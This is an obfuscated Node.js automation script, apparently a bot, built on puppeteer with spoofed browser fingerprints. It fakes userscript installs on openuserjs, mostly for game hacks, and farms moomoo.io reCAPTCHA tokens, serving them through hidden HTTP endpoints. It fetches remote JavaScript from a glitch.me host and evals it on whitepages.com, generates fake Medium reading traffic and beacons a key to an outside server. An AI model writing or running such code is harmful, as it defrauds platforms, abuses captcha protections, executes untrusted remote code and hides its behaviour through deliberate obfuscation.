      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x4, 'AoIN') + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': W(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + X(0x13, '&f[O') + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x1) + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + V(0x6) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + X(0xf, 'AoIN') + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    V(0x0) + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + X(0x7, '5)9A') + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + X(0x2, 'Y1^Y') + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x687 + -0x4 * 0x9bd + 0x206d * 0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x13f2 + 0x1a96 + -0x2e88)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1 * 0x24bd + 0x2 * 0x4e2 + -0x2e1d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x17 * -0x43 + -0xc8 * 0xc + -0x1 * -0xfc9), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x4b * 0x80 + 0x17b0 + 0xdd0;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1a31 + 0x232 * -0x1 + -0x22f * -0xd; w < getRandomInt(-0x193d + -0xf39 * -0x1 + 0x5f * 0x1b, 0x693 * -0x1 + 0x6d * 0x59 + -0x1f4d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1af3b + 0x1 * 0x5024 + -0x114ff);
        }
      }();
    }, 0x23c5 + -0x1 * -0x19b + -0x4 * 0x93f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1a50 + -0x68 * -0x24 + 0x11 * 0xb0;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1d * 0xae + -0xd * -0x1ad + -0x213, -0x289 + -0x1e79 * -0x1 + 0x1bbe * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xbaa6 + 0x1 * -0xc1e7 + 0x1f1bd);
    }, -0x12e2 * 0x1 + 0x856 + 0x190 * 0x7), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1 * -0x21b5 + 0x2 * 0xee5 + -0x3b * -0x11;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1f4 + 0x1d46 + 0x1 * -0xf9a), await u['evaluate'](() => {
            const Y = b;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2 * 0x3e1 + 0x193d + -0x20ff), v[Y(0xc, '(k7l')](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x2ca87 + -0x3c4ee + 0x144b15 * 0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x67d + 0x2 * 0xd9a + -0x214d);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xe * -0x268 + -0x242b + 0x6b * 0xa9);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x494 * -0x5 + 0x6 * -0x5f6 + 0x2c70);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = b;
  async function f() {
    const Z = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xaf9 + -0xe31 + 0x339) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x2 + -0x864 + 0x867));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x97 * 0x2f + 0x1cb7 + 0x1 * -0xfe, D['indexOf']('\x20'));
        return B ? E['slice'](-0x832 + -0xcc + 0x8fe, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1f8 + 0x2713 + -0x1fb),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + Z(0x9) + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1c5e * -0x2 + 0x1a85 + 0x4547),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + a0(0xa, 'q3sV') + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + a1(0x10) + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
